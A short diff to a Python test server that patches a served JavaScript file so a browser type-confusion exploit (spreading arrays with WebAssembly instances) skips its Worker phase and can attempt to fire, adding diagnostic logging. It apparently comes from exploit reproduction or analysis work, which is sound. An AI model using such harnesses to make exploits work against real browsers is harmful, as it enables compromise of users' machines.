@@ -51,7 +51,11 @@ BEEF_PATCH = (
 # Patch: skip the Worker phase, start u() loop directly so the simple type-confusion
 # (spreading arrays with WebAssembly instances) can attempt to fire instead.
 WORKER_ORIG = '};a()};class ut{'
-WORKER_PATCH = '};window.setTimeout(u,0)};class ut{'  # bypass Worker, run u() directly
+WORKER_PATCH = '};console.log("[PATCH] Worker bypassed, scheduling u()");window.setTimeout(u,0)};class ut{'
+
+# Also add diagnostic at start of u() to confirm it runs each iteration
+U_DIAG_ORIG = 'const u=()=>{const n='
+U_DIAG_PATCH = 'const u=()=>{console.log("[U-TICK] e[5]="+String(e[5]));const n='
 
 
 class Handler(http.server.SimpleHTTPRequestHandler):
@@ -71,6 +75,11 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 print('[server] Patched 6beef463.js — Worker phase bypassed, u() starts directly', flush=True)
             else:
                 print('[server] WARNING: WORKER_ORIG not found in 6beef463.js', flush=True)
+            if U_DIAG_ORIG in content:
+                content = content.replace(U_DIAG_ORIG, U_DIAG_PATCH)
+                print('[server] Patched 6beef463.js — u() diagnostic logging added', flush=True)
+            else:
+                print('[server] WARNING: U_DIAG_ORIG not found in 6beef463.js', flush=True)
             data = content.encode('utf-8')
             self.send_response(200)
             self.send_header('Content-Type', 'application/javascript; charset=utf-8')
